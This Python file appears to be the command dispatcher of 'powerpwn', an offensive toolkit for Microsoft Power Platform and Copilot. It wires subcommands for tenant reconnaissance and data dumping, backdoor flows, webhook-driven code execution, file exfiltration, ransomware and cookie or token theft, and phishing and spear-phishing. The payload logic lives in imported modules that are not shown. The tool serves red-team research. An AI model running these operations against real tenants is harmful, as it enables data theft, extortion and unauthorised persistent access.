from __future__ import annotations

import json
import logging
import os
import shutil

from powerpwn.cli.const import LOGGER_NAME
from powerpwn.common.cache.token_cache import TokenCache
from powerpwn.copilot.enums.copilot_scenario_enum import CopilotScenarioEnum
from powerpwn.copilot.enums.verbose_enum import VerboseEnum
from powerpwn.copilot.interactive_chat.interactive_chat import InteractiveChat
from powerpwn.copilot.models.chat_argument import ChatArguments
from powerpwn.copilot_studio.modules.deep_scan import DeepScan
from powerpwn.copilot_studio.modules.enum import Enum
from powerpwn.copilot.spearphishing.automated_spear_phisher import AutomatedSpearPhisher
from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
from powerpwn.nocodemalware.enums.command_to_run_enum import CommandToRunEnum
from powerpwn.nocodemalware.malware_runner import MalwareRunner
from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
from powerpwn.powerdoor.enums.action_type import BackdoorActionType
from powerpwn.powerdoor.flow_factory_installer import FlowFlowInstaller
from powerpwn.powerdump.collect.data_collectors.data_collector import DataCollector
from powerpwn.powerdump.collect.resources_collectors.resources_collector import ResourcesCollector
from powerpwn.powerdump.gui.gui import Gui
from powerpwn.powerdump.utils.auth import Auth, acquire_token, acquire_token_from_cached_refresh_token, get_cached_tenant
from powerpwn.powerdump.utils.const import API_HUB_SCOPE, POWER_APPS_SCOPE
from powerpwn.powerdump.utils.path_utils import collected_data_path, entities_path
from powerpwn.powerphishing.app_installer import AppInstaller

logger = logging.getLogger(LOGGER_NAME)


def __init_command_token(args, scope: str) -> Auth:
    if args.clear_cache:
        TokenCache().clear_token_cache()
        return acquire_token(scope=scope, tenant=args.tenant)

    # if cached refresh token is found, use it
    if auth := acquire_token_from_cached_refresh_token(scope, args.tenant):
        return auth

    logger.info("Failed to acquire token from cached refresh token. Falling back to device-flow authentication to acquire new token.")

    return acquire_token(scope=scope, tenant=args.tenant)


def __clear_cache(cache_path):
    try:
        shutil.rmtree(cache_path)
    except FileNotFoundError:
        pass
    os.makedirs(cache_path, exist_ok=True)


def _get_scoped_cache_path(args, tenant) -> str:
    return os.path.join(args.cache_path, tenant)


def run_recon_command(args) -> str:
    auth = __init_command_token(args, POWER_APPS_SCOPE)

    # cache
    if args.clear_cache:
        __clear_cache(os.path.join(args.cache_path, os.path.join(auth.tenant, "resources")))

    scoped_cache_path = _get_scoped_cache_path(args, auth.tenant)
    entities_fetcher = ResourcesCollector(token=auth.token, cache_path=scoped_cache_path)
    entities_fetcher.collect_and_cache()

    logger.info(f"Recon is completed for tenant {auth.tenant} in {entities_path(scoped_cache_path)}")

    return auth.tenant


def run_gui_command(args) -> None:
    """
    Run local server for basic gui to show collected resources and data.
    tenant inference for data:
    1. if provided in args, use it
    2. try to get tenant from cached token and use it
    3. if only one tenant exist in cache path, use it
    4. otherwise, require tenant

    """
    scoped_cache_path: str | None = None
    if args.tenant:
        scoped_cache_path = _get_scoped_cache_path(args, args.tenant)
    elif cached_tenant := get_cached_tenant():
        scoped_cache_path = _get_scoped_cache_path(args, cached_tenant)
        logger.info(f"The cached tenant found is {cached_tenant}.")
    else:
        tenant_list = os.listdir(args.cache_path)
        if len(tenant_list) == 1:
            scoped_cache_path = _get_scoped_cache_path(args, tenant_list[0])
            logger.info(f"Only one tenant found in cache path. Using '{tenant_list[0]}' as tenant.")

    if not scoped_cache_path:
        logger.error("Tenant is not provided and it can not be found in cache. Please provide tenant id with -t flag.")
        return
    Gui().run(cache_path=scoped_cache_path)


def run_dump_command(args) -> str:
    if args.recon:
        run_recon_command(args)

    auth = __init_command_token(args, API_HUB_SCOPE)

    if args.clear_cache:
        __clear_cache(os.path.join(args.cache_path, os.path.join(auth.tenant, "data")))

    scoped_cache_path = _get_scoped_cache_path(args, auth.tenant)
    is_data_collected = DataCollector(token=auth.token, cache_path=scoped_cache_path).collect()
    if not is_data_collected:
        logger.info("No resources found to get data dump. Please make sure recon runs first or run dump command again with -r/--recon flag.")
    else:
        logger.info(f"Dump is completed for tenant {auth.tenant} in {collected_data_path(scoped_cache_path)}")

    return auth.tenant


def run_backdoor_flow_command(args):
    action_type = BackdoorActionType(args.backdoor_subcommand)
    if action_type == BackdoorActionType.delete_flow:
        backdoor_flow = BackdoorFlow(args.webhook_url)
        backdoor_flow.delete_flow(args.environment_id, args.flow_id)

    elif action_type == BackdoorActionType.create_flow:
        backdoor_flow = BackdoorFlow(args.webhook_url)
        backdoor_flow.create_flow_from_input_file(args.environment_id, args.input)

    elif action_type == BackdoorActionType.get_connections:
        backdoor_flow = BackdoorFlow(args.webhook_url)
        output_to_file = args.output and args.output != ""
        connections = backdoor_flow.get_connections(args.environment_id, not output_to_file)
        if output_to_file:
            f = open(args.output, "w+")
            f.write(json.dumps(connections, indent=4))
        else:
            logger.info(connections)

    elif action_type == BackdoorActionType.install_factory:
        auth = __init_command_token(args, POWER_APPS_SCOPE)
        FlowFlowInstaller(auth.token).install(args.environment_id, args.connection_id)


def run_nocodemalware_command(args):
    malware_runner = MalwareRunner(args.webhook_url)

    command_type = CommandToRunEnum(args.nocodemalware_subcommand)
    if command_type == CommandToRunEnum.CLEANUP:
        res = malware_runner.cleanup()
    elif command_type == CommandToRunEnum.CODE_EXEC:
        res = malware_runner.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
    elif command_type == CommandToRunEnum.EXFILTRATION:
        res = malware_runner.exfiltrate(args.file)
    elif command_type == CommandToRunEnum.RANSOMWARE:
        res = malware_runner.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
    elif command_type == CommandToRunEnum.STEAL_COOKIE:
        res = malware_runner.steal_cookie(args.cookie)
    elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
        res = malware_runner.steal_power_automate_token()
    print(res)


def run_phishing_command(args):
    auth = __init_command_token(args, POWER_APPS_SCOPE)
    app_installer = AppInstaller(auth.token)
    if args.phishing_subcommand == "install-app":
        return app_installer.install_app(args.input, args.app_name, args.environment_id)
    elif args.phishing_subcommand == "share-app":
        return app_installer.share_app_with_org(args.app_id, args.environment_id, args.tenant)
    raise NotImplementedError("Phishing command has not been implemented yet.")


def run_copilot_chat_command(args):
    parsed_args = ChatArguments(
        user=args.user,
        password=args.password,
        use_cached_access_token=args.cached_token,
        verbose=VerboseEnum(args.verbose),
        scenario=CopilotScenarioEnum(args.scenario),
    )

    if args.copilot_subcommand == "chat":
        InteractiveChat(parsed_args).start_chat()
        return
    elif args.copilot_subcommand == "spear-phishing":
        spear = AutomatedSpearPhisher(parsed_args)
        spear.phish()
        return

    raise NotImplementedError(f"Copilot {args.copilot_subcommand} subcommand has not been implemented yet.")


def run_copilot_studio_command(args):
    # copilot_studio_main.main(args)

    if args.copilot_studio_subcommand == "deep-scan":
        DeepScan(args)
        return
    elif args.copilot_studio_subcommand == "enum":
        Enum(args)
        return

    raise NotImplementedError("Copilot studio command has not been implemented yet.")
